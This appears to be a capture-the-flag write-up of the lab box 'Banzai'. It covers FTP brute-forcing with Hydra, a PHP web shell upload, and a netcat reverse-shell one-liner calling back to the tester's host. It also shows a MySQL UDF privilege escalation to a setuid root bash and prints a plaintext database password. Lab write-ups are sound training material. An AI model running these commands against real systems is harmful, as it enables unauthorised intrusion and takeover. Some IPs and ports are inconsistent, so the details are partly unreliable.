---
title: "HTB - Banzai"
date: 2025-10-26T15:30:00+08:00
draft: false
ShowToc: true
TocOpen: true
---

# Box Info 

> Purpose: You will discover weak credentials in an FTP service that allow you to upload a web shell to a misconfigured web server. Following this, you will develop a custom function to execute commands as root on a poorly configured MySQL database. This exercise will enhance your skills in credential exploitation and database misconfiguration attacks.

#  Recon

###  NMAP  — Scans

> The tester used Nmap to scan the target; to ensure comprehensive coverage the scan was run with the `--max-rate` option so that all ports were probed quickly—otherwise some open ports might have been missed.

```shell
Not shown: 65528 filtered ports
PORT     STATE  SERVICE
20/tcp   closed ftp-data
21/tcp   open   ftp
22/tcp   open   ssh
25/tcp   open   smtp
5432/tcp open   postgresql
8080/tcp open   http-proxy
8295/tcp open   unknown
```


####  SMTP Recon
>! Pasted image 20251104160139.png 


---
#### Web Recon 
! Pasted image 20251104153407.png 

1.   WebSite Directory BurteForce 
```
parallels@ubuntu-linux-2404:~/Desktop/box$ feroxbuster -u http://192.168.213.56:8080 -x php html
                                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.213.56:8080/
 🚩  In-Scope Url          │ 192.168.213.56
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 13m    90000/90000   0s      found:0       errors:2      
[####################] - 13m    90000/90000   117/s   http://192.168.213.56:8080/                                                                                                       parallels@ubuntu-linux-2404:~/Desktop/box$ 
```


---
####  FTP to www-data
> An initial attempt to authenticate to the FTP service using the `anonymous` account failed. Subsequently, the tester performed a brute-force attack with Hydra and obtained valid administrative credentials (`admin: <REDACTED>`). The FTP server initially operated in passive mode; switching to active mode was required to successfully enumerate the remote directory structure. Investigation revealed that the FTP service's upload directory mapped to a web-accessible location associated with port 8258. Using the compromised administrative account, the tester uploaded a web shell to that path.
```
parallels@ubuntu-linux-2404:~/Desktop/box$ ftp 192.168.213.56
Connected to 192.168.213.56.
220 (vsFTPd 3.0.3)
Name (192.168.213.56:parallels): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```


```shell
parallels@ubuntu-linux-2404:~/Desktop$  hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -V -t 4 ftp://192.168.213.56
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-04 16:36:34
[DATA] max 4 tasks per 1 server, overall 4 tasks, 66 login tries, ~17 tries per task
[DATA] attacking ftp://192.168.213.56:21/
[ATTEMPT] target 192.168.213.56 - login "anonymous" - pass "anonymous" - 1 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "root" - pass "rootpasswd" - 2 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "root" - pass "12hrs37" - 3 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "ftp" - pass "b1uRR3" - 4 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "admin" - pass "admin" - 5 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "localadmin" - pass "localadmin" - 6 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "admin" - pass "1234" - 7 of 66 [child 1] (0/0)
[21][ftp] host: 192.168.213.56   login: admin   password: REDACTED
[ATTEMPT] target 192.168.213.56 - login "apc" - pass "apc" - 8 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "Root" - pass "wago" - 10 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "Admin" - pass "wago" - 11 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "User" - pass "user" - 12 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "Guest" - pass "guest" - 13 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "ftp" - pass "ftp" - 14 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "a" - pass "avery" - 16 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "adtec" - pass "none" - 18 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "none" - pass "dpstelecom" - 20 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "instrument" - pass "instrument" - 21 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "user" - pass "password" - 22 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "root" - pass "password" - 23 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "default" - pass "default" - 24 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "nmt" - pass "1234" - 26 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "supervisor" - pass "supervisor" - 28 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "user1" - pass "pass1" - 29 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "avery" - pass "avery" - 30 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "IEIeMerge" - pass "eMerge" - 31 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "ADMIN" - pass "12345" - 32 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "beijer" - pass "beijer" - 33 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "Admin" - pass "admin" - 34 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "root" - pass "admin" - 37 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "se" - pass "1234" - 38 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "device" - pass "apc" - 40 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "apc" - pass "apc" - 41 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "dm" - pass "ftp" - 42 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "dmftp" - pass "ftp" - 43 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "httpadmin" - pass "fhttpadmin" - 44 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "user" - pass "system" - 45 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "MELSEC" - pass "MELSEC" - 46 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "QNUDECPU" - pass "QNUDECPU" - 47 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "ftp_boot" - pass "ftp_boot" - 48 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "uploader" - pass "ZYPCOM" - 49 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "ftpuser" - pass "password" - 50 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "USER" - pass "USER" - 51 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "qbf77101" - pass "hexakisoctahedron" - 52 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "ntpupdate" - pass "ntpupdate" - 53 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "sysdiag" - pass "factorycast@schneider" - 54 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "wsupgrade" - pass "wsupgrade" - 55 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "pcfactory" - pass "pcfactory" - 56 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "loader" - pass "fwdownload" - 57 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "test" - pass "testingpw" - 58 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "webserver" - pass "webpages" - 59 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "fdrusers" - pass "sresurdf" - 60 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.213.56 - login "nic2212" - pass "poiuypoiuy" - 61 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.213.56 - login "user" - pass "user00" - 62 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "su" - pass "ko2003wa" - 63 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.213.56 - login "MayGion" - pass "maygion.com" - 64 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.213.56 - login "PlcmSpIp" - pass "PlcmSpIp" - 66 of 66 [child 1] (0/0)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-04 16:37:30
```

reference : https://blog.csdn.net/carolzhang8406/article/details/6079899
```
parallels@ubuntu-linux-2404:~/Desktop$ ftp 192.168.146.56
Connected to 192.168.146.56.
220 (vsFTPd 3.0.3)
Name (192.168.146.56:parallels): admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||27870|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> 229 Entering Extended Passive Mode (|||27870|)
?Invalid command.
ftp> epsv4 off
EPSV/EPRT on IPv4 off.
ftp> ls
227 Entering Passive Mode (192,168,146,56,154,171).


^C
receive aborted. Waiting for remote to finish abort.
ftp> passive 
Passive mode: off; fallback to active mode: off.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
ftp> 

ftp> 
```

```shell 
parallels@ubuntu-linux-2404:~/Desktop/ftp$  ftp 192.168.219.56
Connected to 192.168.219.56.
220 (vsFTPd 3.0.3)
Name (192.168.219.56:parallels): admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> epsv4 off
EPSV/EPRT on IPv4 off.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> binary
200 Switching to Binary mode.
ftp> put revshell.php
local: revshell.php remote: revshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
100% |*******************************************************************************************************************************************|    26      198.36 KiB/s    00:00 ETA
226 Transfer complete.
26 bytes sent in 00:00 (0.05 KiB/s)
ftp> 

```

```
wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
ftp 192.168.219.56

epsv4 off
binary 
passive
put shell.php
```


>A firewall inspection indicated that most ports were filtered; only TCP ports 21, 22, and 25 were permitted. Because these are the only allowed channels for external traffic, the tester staged the reverse shell over port 21.


> An HTTP request to `http://192.168.248.56:8295/shell.php` returned a web shell payload hosted on the server, allowing remote command execution through the web interface."

! Pasted image 20251105172649.png 


```
parallels@ubuntu-linux-2404:~/Desktop$ sudo nc -lvnp 21 
[sudo] password for parallels: 
Listening on 0.0.0.0 21
Connection received on 192.168.119.56 35350
/bin/sh: 0: can't access tty; job control turned off
$ ls

```

```
www-data@banzai:/var/www# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.212 21 >/tmp/f
```

---
## www-data to root
> During enumeration the tester discovered a configuration file containing sensitive database credentials, including the database username and password.
```shell
www-data@banzai:…/www/html# find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
/lib/systemd/system/sys-kernel-config.mount
/lib/modules/4.9.0-12-amd64/kernel/fs/configfs/configfs.ko
<snip>
/var/www/config.php
/sbin/shadowconfig
/sbin/plipconfig
/sbin/ldconfig
<snip>

www-data@banzai:…/www/html# cat /var/www/config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
```

> root : EscalateRaftHubris123

> Once the tester obtained root-level credentials on the host, they leveraged this access to perform a MySQL UDF (User-Defined Function) attack against the database server, enabling arbitrary command execution on the system. For further technical background, see the referenced write-up. (Reference: freebuf — [https://www.freebuf.com/articles/web/396554.html](https://www.freebuf.com/articles/web/396554.html)
```shell
parallels@ubuntu-linux-2404:~/Desktop$ wget https://www.exploit-db.com/download/1518
parallels@ubuntu-linux-2404:~/Desktop$ ftp 192.168.119.56
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> put 1518
local: 1518 remote: 1518
200 PORT command successful. Consider using PASV.
150 Ok to send data.
100% |*******************************************************************************************|  3378       13.04 MiB/s    00:00 ETA
226 Transfer complete.
3378 bytes sent in 00:00 (4.93 KiB/s)
ftp> 
```

```
www-data@banzai:/var/www$ cp html/1518 udf.c
www-data@banzai:/var/www$ ls
agent  config.php  html  udf.c
www-data@banzai:/var/www$ gcc -g -c udf.c 
```

```
www-data@banzai:mysql -u root -p  
www-data@banzai:/var/www# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
www-data@banzai:/var/www# ls
agent
config.php
html
raptor_udf2.c
raptor_udf2.o
raptor_udf2.so
```

```mysql
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.02 sec)

mysql> insert into foo values(load_file('/var/www/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.01 sec)

mysql> \! cp /var/www/raptor_udf2.so /usr/lib/mysql/plugin
mysql> 
```


```
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)
```


```
mysql> select do_system('cp /bin/bash /var/www/bash ; chmod +s /var/www/bash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /var/www/bash ; chmod +s /var/www/bash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> 
[1]+  Stopped                 mysql -u root -p
www-data@banzai:/var/www$ ls
agent  config.php  raptor_udf2.c  raptor_udf2.so
bash   html	   raptor_udf2.o  whoami.txt
www-data@banzai:/var/www$ ./bash -p
bash-4.4# ls
agent  config.php  raptor_udf2.c  raptor_udf2.so
bash   html	   raptor_udf2.o  whoami.txt
bash-4.4# whoami 
root
bash-4.4# 
```



